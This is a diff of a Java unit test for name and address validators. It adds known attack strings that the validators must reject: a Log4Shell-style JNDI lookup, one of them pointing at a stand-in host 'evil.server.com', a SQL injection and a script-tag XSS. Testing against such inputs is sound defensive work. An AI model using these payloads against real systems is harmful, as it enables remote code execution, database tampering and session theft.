@@ -18,7 +18,7 @@ public class ValidationsTest {
     @Inject
     Validator validator;
 
-    public static final String STREET = "123 Main Street";
+    public static final String STREET = "123 S. Main Street, Unit 555";
     public static final String CITY = "Big City";
     public static final String STATE = "CA";
     public static final String ZIP = "55555";
@@ -73,13 +73,23 @@ public class ValidationsTest {
             assertEquals(0, pass.size());
         });
 
-        var bad = new ArrayList<>(Arrays.asList( "TomsNum1", "Toms#One", " Tom", "${jdbc:ldap:\\\\}", "F#@^",
+        var bad = new ArrayList<>(Arrays.asList( "TomsNum1", "Toms#One", " Tom", "${jndi:ldap:\\\\}", "F#@^",
                 "' or 1=1;--", "<script>alert(1)</script>", "'tom"));
         bad.forEach(name -> {
             var fail = validator.validate(new NameTest(name));
             System.out.println(name);
             assertEquals(1, fail.size());
         });
+    }
+
+    @Test
+    void testNoSpecialChars(){
+
+        var fail = validator.validate(new Address("${jndi:ldap:\\\\evil.server.com}", CITY, STATE, ZIP));
+        assertEquals(1, fail.size());
+
+        var pass = validator.validate(new Address(STREET, CITY, STATE, ZIP));
+        assertEquals(0, pass.size());
     }
 }
 
